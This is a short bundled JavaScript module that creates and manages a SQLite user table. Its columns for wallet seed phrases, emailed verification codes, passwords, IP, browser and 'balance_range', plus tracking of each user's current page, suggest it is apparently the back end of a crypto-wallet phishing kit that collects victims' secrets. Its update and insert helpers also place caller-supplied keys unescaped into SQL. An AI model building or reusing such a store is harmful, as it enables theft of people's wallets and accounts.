import sqlite3 from 'sqlite3';
import { open } from 'sqlite';

let db;
async function initializeDb() {
  if (!db) {
    db = await open({
      filename: "users.db",
      driver: sqlite3.Database
    });
    await db.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT,
        email TEXT UNIQUE,
        password TEXT,
        current_page TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        status TEXT DEFAULT 'active',
        user_seed_phrase TEXT,
        email_code TEXT,
        ip_address TEXT,
        browser TEXT,
        operating_system TEXT,
        user_agent TEXT,
        balance_range TEXT,
        connection_info TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);
  }
  return db;
}
async function getAllUsers() {
  const db2 = await initializeDb();
  return db2.all("SELECT * FROM users ORDER BY updated_at DESC");
}
async function getUserByEmail(email) {
  const db2 = await initializeDb();
  return db2.get("SELECT * FROM users WHERE email = ?", [email]);
}
async function updateUser(email, updates) {
  const db2 = await initializeDb();
  const fields = Object.keys(updates);
  const values = Object.values(updates);
  const setClause = fields.map((field) => `${field} = ?`).join(", ");
  const query = `UPDATE users SET ${setClause}, updated_at = CURRENT_TIMESTAMP WHERE email = ?`;
  return db2.run(query, [...values, email]);
}
async function createUser(userData) {
  const db2 = await initializeDb();
  const fields = Object.keys(userData);
  const values = Object.values(userData);
  const placeholders = fields.map(() => "?").join(", ");
  const query = `INSERT INTO users (${fields.join(", ")}) VALUES (${placeholders})`;
  return db2.run(query, values);
}
async function deleteAllUsers(adminEmail) {
  const db2 = await initializeDb();
  return db2.run("DELETE FROM users WHERE email != ?", [adminEmail]);
}

export { getAllUsers as a, createUser as c, deleteAllUsers as d, getUserByEmail as g, initializeDb as i, updateUser as u };
